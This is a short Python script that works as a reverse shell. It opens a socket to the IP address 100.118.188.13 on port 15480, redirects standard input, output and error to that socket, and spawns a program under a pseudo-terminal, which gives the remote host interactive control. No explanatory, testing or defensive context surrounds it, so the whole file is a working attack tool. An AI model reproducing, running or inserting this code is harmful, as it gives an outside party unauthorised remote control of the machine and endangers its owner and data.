import sys
import socket
import os
import pty

s=socket.socket()
s.connect(('100.118.188.13', 15480))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(sys.argv[1])
